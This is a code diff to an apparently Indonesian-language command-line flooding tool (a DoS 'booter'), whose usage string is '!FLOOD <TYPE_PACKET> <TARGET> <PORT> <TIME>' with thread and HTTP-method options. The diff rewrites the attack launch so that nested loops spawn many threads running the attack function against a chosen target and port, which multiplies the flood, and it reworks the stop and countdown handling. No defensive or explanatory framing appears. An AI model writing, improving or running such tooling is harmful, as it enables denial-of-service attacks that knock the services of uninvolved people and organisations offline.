@@ -110,15 +110,10 @@ def countdown_timer(time_loader):
     if not stop_attack.is_set():
         print(f"\n{Fore.GREEN}Serangan Selesai{Fore.RESET}")
 
-def stop_attack_thread(time_loader):
-    while time.time() < time_loader and not stop_attack.is_set():
-        try:
-            input()  # Non-blocking input check
-            stop_attack.set()  # Stop attack on Enter
-            print(f"\n{Fore.YELLOW}Serangan Dihentikan{Fore.RESET}")
-            break
-        except EOFError:
-            pass  # Ignore EOFError from input
+def stop_attack_thread():
+    input()
+    stop_attack.set()  # Stop attack on Enter
+    print(f"\n{Fore.YELLOW}Serangan Dihentikan{Fore.RESET}")
 
 def confirm_exit():
     while True:
@@ -129,6 +124,7 @@ def confirm_exit():
             print(f"\n{Fore.RED}Program terminated by user (Enter). Exiting...{Fore.RESET}")
             sys.exit(0)
         elif choice == 'n':
+            print()  # Add newline for clean prompt
             return
 
 def command():
@@ -171,15 +167,19 @@ def command():
                         stop_attack.clear()  # Reset stop flag
                         print(f"{Fore.LIGHTCYAN_EX}Serangan diMulai\n{Fore.YELLOW}Target: {target_loader}\nPort: {port_loader}\nType: {data_type_loader_packet}\n{Fore.RESET}")
                         # Start attack threads
-                        attack_thread = threading.Thread(target=runing_attack, args=(ip, host, port_loader, time_loader, spam_loader, methods_loader, booter_sent, data_type_loader_packet))
-                        attack_thread.start()
+                        for _ in range(create_thread):
+                            for _ in range(spam_create_thread):
+                                th = threading.Thread(target=runing_attack, args=(ip, host, port_loader, time_loader, spam_loader, methods_loader, booter_sent, data_type_loader_packet))
+                                th.start()
                         # Start countdown timer
                         threading.Thread(target=countdown_timer, args=(time_loader,)).start()
                         # Start stop attack thread
-                        threading.Thread(target=stop_attack_thread, args=(time_loader,)).start()
+                        threading.Thread(target=stop_attack_thread).start()
                         # Wait for attack to finish or be stopped
-                        attack_thread.join()  # Wait for attack thread to complete
+                        while not stop_attack.is_set() and time.time() < time_loader:
+                            time.sleep(0.1)
                         stop_attack.set()  # Ensure attack stops
+                        print()  # Add newline for clean prompt
                         continue  # Return to COMMAND prompt
                 else:
                     print(f"{Fore.RED}!FLOOD <TYPE_PACKET> <TARGET> <PORT> <TIME> {Fore.LIGHTRED_EX}<SPAM_THREAD> <CREATE_THREAD> <BOOTER_SENT> {Fore.WHITE}<HTTP_METHODS> <SPAM_CREATE>{Fore.RESET}")
